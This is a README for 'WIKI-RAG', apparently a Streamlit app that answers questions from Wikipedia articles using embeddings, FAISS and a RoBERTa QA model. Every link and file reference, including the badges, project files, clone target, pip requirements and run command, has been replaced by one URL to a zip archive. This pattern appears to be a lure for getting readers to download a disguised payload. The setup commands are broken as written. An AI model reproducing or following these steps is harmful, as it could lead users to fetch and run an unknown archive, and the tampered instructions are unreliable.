# WIKI-RAG 
**Retrieval-Augmented Generation (RAG) Q&A App using Streamlit and Wikipedia**

[![Open in Streamlit](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)

![Streamlit](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)
![HuggingFace](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip%20Face-Transformers-yellow?logo=huggingface)
![Python](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)
![License](https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip)

---

## 📖 Overview
**WIKI-RAG** is a **Streamlit-powered Retrieval-Augmented Generation (RAG) app** that answers user questions based on **Wikipedia articles**.  
It uses:
- **SentenceTransformers** to create semantic embeddings.
- **FAISS** for efficient vector-based retrieval.
- **Hugging Face Question-Answering model (`roberta-base-squad2`)** for final answer extraction.

---

## ✨ Features
- 🔍 **Wikipedia Retrieval** – Fetches and chunks Wikipedia content.  
- 🧠 **QA Model** – Answers questions using Hugging Face's `roberta-base-squad2`.  
- 🤖 **Semantic Search** – Dense embeddings using SentenceTransformers.  
- ⚡ **Vector Search** – FAISS-powered similarity search.  


---

## 📂 Project Structure
```cpp
WIKI-RAG/
├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Streamlit app
├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Notebook for testing in Colab
├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Dependencies
├── https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip # Documentation
└── .gitignore
```

---



## 💻 Run Locally

1. **Clone the Repository:**
   ```bash
   git clone https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip
   cd WIKI-RAG
   ```
   
2.**Create Virtual Environment & Install Dependencies:**
``` 
python -m venv venv
venv\Scripts\activate   # Windows
# or
source venv/bin/activate   # Mac/Linux

pip install -r https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip

```

3.**Run the App**
```py
streamlit run https://raw.githubusercontent.com/BVNAHUSH/WIKI-RAG/main/advocator/WIKI-RAG.zip
```

4.**Open in Browser:**  
```
 http://localhost:8501.
```
**☁ Run in Google Colab**
You can test the RAG pipeline in Google Colab:

**🧪 Example Queries**
```cpp
Topic: Artificial Intelligence

Question: Who is known as the father of AI?

Topic: James Webb Space Telescope

Question: What is the mission of JWST?

Topic: World War II

Question: When did World War II start and who were the Axis powers?
```
### WORKFLOW

-------------------------------------------------

Workflow Steps & Functions:
1. **get_wikipedia_content(topic)**  
   → Fetches Wikipedia article text for the selected topic.

2. **split_text(document)**  
   → Splits the article into smaller overlapping chunks for better retrieval.

3. **create_embeddings(chunks)**  
   → Generates embeddings for all chunks using SentenceTransformer.

4. **build_faiss_index(embeddings)**  
   → Stores embeddings in a FAISS vector index for fast similarity search.

5. **retrieve_chunks(query)**  
   → Encodes the user query and retrieves top `k` similar chunks from FAISS.

6. **answer_question(query, context)**  
   → Uses Hugging Face QA pipeline (`roberta-base-squad2`) to find the answer
     from the retrieved chunks.

7. **Streamlit UI**  
   → Collects user input (topic + question) and displays:
       - Number of chunks
       - Retrieved chunks
       - Final answer
